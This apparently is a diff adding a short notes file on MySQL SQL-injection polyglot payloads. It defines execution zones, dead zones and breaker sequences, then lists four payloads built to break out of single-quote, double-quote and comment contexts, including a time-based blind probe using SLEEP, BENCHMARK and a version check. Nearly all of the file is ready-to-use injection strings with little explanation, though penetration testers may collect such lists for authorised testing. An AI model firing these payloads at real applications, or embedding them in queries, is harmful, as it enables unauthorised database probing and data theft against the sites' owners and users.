@@ -1,0 +1,22 @@
+Payload View
+
+Execution Zone  	— Part of the payload that is supposed to be executed (MySQL Query) — e.x. alert(‘1’)
+Dead Zone			— Part of the payload that is not supposed to be executed (Inside strings, comments, unreachable IF clauses)
+Breaker Sequence 	— Part of the payload that ends one of the zones and start one of the others ( ‘ breaking out of string, */ breaking out of comment and into query)
+
+
+1.
+
+SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/			Works in single, double quote context and in straight into query context
+
+2.
+
+SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/ FROM some_table WHERE ex = ample
+
+3.
+
+1/*’ or 1 or ‘’’ or 1 or ‘’*//*
+
+4. MySQL
+
+/*’ or ‘’=‘’’ or ‘’’’=‘’*/
